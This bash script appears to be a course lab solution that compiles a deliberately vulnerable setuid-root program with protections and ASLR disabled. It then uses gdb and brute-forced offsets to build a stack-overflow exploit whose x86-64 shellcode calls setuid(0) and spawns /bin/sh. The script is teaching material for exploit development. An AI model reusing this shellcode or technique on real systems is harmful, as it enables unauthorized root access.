#!/bin/bash

################################################################################
#
# Note: This script assumes gdb-peda is installed, if gd-peda is not installed
#       then the offsets for substring computation to parse gdb output will
#       need to be adjusted slightly
#
# Note: The script will run compile a fresh binary, and work its way through
#       the exploit development steps to generate an exploit that runs on the
#       the shell. Don't run if you are in the middle of a manual development
#       experiment since it will change the environment.
#
# Note: This script also sets environment variables which affect program offsets
#       so you should run the script by invoking "source ./solution2.sh" to 
#       inherit the environment changes to be able to exploit the program
#       again with the generated exploit file.
#
################################################################################

# assume we are in the lab3 directory
cd ~/Desktop/lab3

# clean up previous experiments
rm -f debug
rm -f gdb_exploit
rm -f exploit

# turn off ASLR
sudo sysctl -w kernel.randomize_va_space=0

# compile vulnerable code with all security mechanisms disabled
# note: no-pie and norelro may be enabled for this exploit
# note: -g to set debug options is only used for autogen of exploit, but is not necessary, try with commented gcc command
#       since a more advanced script could be developed using inspect memory commands or other approaches
gcc basic_vuln.c -g -no-pie -fno-stack-protector -z norelro -z execstack -o basic_vuln
#gcc basic_vuln.c -g -fno-stack-protector -z execstack -o basic_vuln

# change the owner of the vulnerable program to root and set its permissions to 4755
# for details see http://www.filepermissions.com/file-permission/4755
sudo chown root basic_vuln
sudo chmod 4755 basic_vuln

echo
echo "Generating exploits for basic_vuln..."
ls -l basic_vuln
echo

# write exploit template for debugging purposes
python -c 'import sys; sys.stdout.write("A"*64 + "B"*8 + "C"*6)' > exploit_template

# batch GDB to run exploit template and get jump target
# this attempts to remove GDB environment variables LINES and COLUMNS first
# in order to compute a jump target that is closer to the target outside fo GDB
gdb -q basic_vuln -batch \
  -ex "unset env LINES" \
  -ex "unset env COLUMNS" \
  -ex "break *main+47" \
  -ex "run $(cat exploit_template)" \
  -ex "x/100bx &buf" \
  -ex "print (void*) &buf + (12/2)" \
  -ex quit \
  > debug

# read last line of debug session to get target address
JUMP_TARGET_RAW="$(tail -1 debug)"

# parse and print the address of the jump target
#echo "JUMP_TARGET_RAW=$JUMP_TARGET_RAW"
JUMP_TARGET=${JUMP_TARGET_RAW:16:12}
echo "Found Debugger Jump Target:"
echo "JUMP_TARGET=0x$JUMP_TARGET"
echo

# nasty hack to convert jump target to little endian
# I am 100 percent sure there is a better way to do this, I apologize in advanced for the nasty escaping as well
CONVERT_TO_LITTLE_ENDIAN_PROGRAM="import re; bytes=re.findall('..', '$JUMP_TARGET'); bytes.reverse(); import sys; sys.stdout.write(''.join(['\\\x'+b for b in bytes]))"
JUMP_TARGET_LITTLE_ENDIAN=$(python -c "$CONVERT_TO_LITTLE_ENDIAN_PROGRAM")
#echo "JUMP_TARGET_LITTLE_ENDIAN=$JUMP_TARGET_LITTLE_ENDIAN"

# more nasty hack...
# generate an exploit generation program...then run it to generate the exploit
EXPLOIT_GENERATOR_PROGRAM="import sys; sys.stdout.write('\\x90'*(64-52) + '\\x48\\x83\\xC4\\x40\\x48\\x31\\xff\\xb0\\x69\\x0f\\x05\\x48\\x31\\xd2\\x48\\xbb\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58\\x0f\\x05' + 'A'*8 + '$JUMP_TARGET_LITTLE_ENDIAN')"
#echo "EXPLOIT_GENERATOR_PROGRAM=$EXPLOIT_GENERATOR_PROGRAM"

python -c "$EXPLOIT_GENERATOR_PROGRAM" > gdb_exploit

echo "Testing Exploit in GDB:"

# run exploit in GDB
gdb -q basic_vuln -batch \
  -ex "unset env LINES" \
  -ex "unset env COLUMNS" \
  -ex "run $(cat gdb_exploit)"

echo
echo "Generated Debugger Exploit: "
hexdump gdb_exploit -C
echo

echo "---------------------------------------------------"
echo "Adjusting exploit jump target offset for shell..."
echo "On success, a shell will be spawned. Type \"exit\" to complete."
echo "---------------------------------------------------"

# helper function to test if our brute force method was successful
# which is used in the next step below
function test_exploit {
  ./basic_vuln $(cat exploit)
  if [ $? -eq 0 ]; then
    # if basic_vuln didn't crash then the exploit was successful
    echo "---------------------------------------------------"
    echo "Success exploit generated with JUMP_TARGET=0x$POSITIVE_OFFSET_JUMP_TARGET (+$BYTE_OFFSET bytes)"
    hexdump exploit -C
    echo "Run: ./basic_vuln \$(cat exploit)"
    echo "---------------------------------------------------"
    # indicate true
    return 0
  else
    return 1
  fi
}

# run outside of GDB
# guess and check to adjust for the offset change outside fo GDB
BYTE_OFFSET=0
MAX_OFFSET_SEARCH=100
while [ $BYTE_OFFSET -le $MAX_OFFSET_SEARCH ]; do
  # assume we don't know how the offset changed, so guess by increasing distances
  # of +/- 1 byte, when we get a shell this loop will terminate
  CALCULATE_POSITIVE_OFFSET_JUMP_TARGET_PROGRAM="print(str(hex(int('$JUMP_TARGET',16) + 8*$BYTE_OFFSET))[2:])"
  POSITIVE_OFFSET_JUMP_TARGET=$(python -c "$CALCULATE_POSITIVE_OFFSET_JUMP_TARGET_PROGRAM")
  echo "Trying JUMP_TARGET=0x$POSITIVE_OFFSET_JUMP_TARGET (+$BYTE_OFFSET bytes)"

  # repeat nasty hacks to build positive offset exploit
  CONVERT_TO_LITTLE_ENDIAN_PROGRAM="import re; bytes=re.findall('..', '$POSITIVE_OFFSET_JUMP_TARGET'); bytes.reverse(); import sys; sys.stdout.write(''.join(['\\\x'+b for b in bytes]))"
  JUMP_TARGET_LITTLE_ENDIAN=$(python -c "$CONVERT_TO_LITTLE_ENDIAN_PROGRAM")
  EXPLOIT_GENERATOR_PROGRAM="import sys; sys.stdout.write('\\x90'*(64-52) + '\\x48\\x83\\xC4\\x40\\x48\\x31\\xff\\xb0\\x69\\x0f\\x05\\x48\\x31\\xd2\\x48\\xbb\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58\\x0f\\x05' + 'A'*8 + '$JUMP_TARGET_LITTLE_ENDIAN')"
  python -c "$EXPLOIT_GENERATOR_PROGRAM" > exploit
  test_exploit
  if [ $? -eq 0 ]; then
    # exploit was successful on the shell, we are done searching
    break
  fi

  CALCULATE_NEGATIVE_OFFSET_JUMP_TARGET_PROGRAM="print(str(hex(int('$JUMP_TARGET',16) - 8*$BYTE_OFFSET))[2:])"
  NEGATIVE_OFFSET_JUMP_TARGET=$(python -c "$CALCULATE_NEGATIVE_OFFSET_JUMP_TARGET_PROGRAM")
  echo "Trying JUMP_TARGET=0x$NEGATIVE_OFFSET_JUMP_TARGET (-$BYTE_OFFSET bytes)"

  # repeat nasty hacks to build negative offset exploit
  CONVERT_TO_LITTLE_ENDIAN_PROGRAM="import re; bytes=re.findall('..', '$NEGATIVE_OFFSET_JUMP_TARGET'); bytes.reverse(); import sys; sys.stdout.write(''.join(['\\\x'+b for b in bytes]))"
  JUMP_TARGET_LITTLE_ENDIAN=$(python -c "$CONVERT_TO_LITTLE_ENDIAN_PROGRAM")
  EXPLOIT_GENERATOR_PROGRAM="import sys; sys.stdout.write('\\x90'*(64-52) + '\\x48\\x83\\xC4\\x40\\x48\\x31\\xff\\xb0\\x69\\x0f\\x05\\x48\\x31\\xd2\\x48\\xbb\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58\\x0f\\x05' + 'A'*8 + '$JUMP_TARGET_LITTLE_ENDIAN')"
  python -c "$EXPLOIT_GENERATOR_PROGRAM" > exploit
  test_exploit
  if [ $? -eq 0 ]; then
    # exploit was successful on the shell, we are done searching
    break
  fi

  ((BYTE_OFFSET=BYTE_OFFSET+1))
done
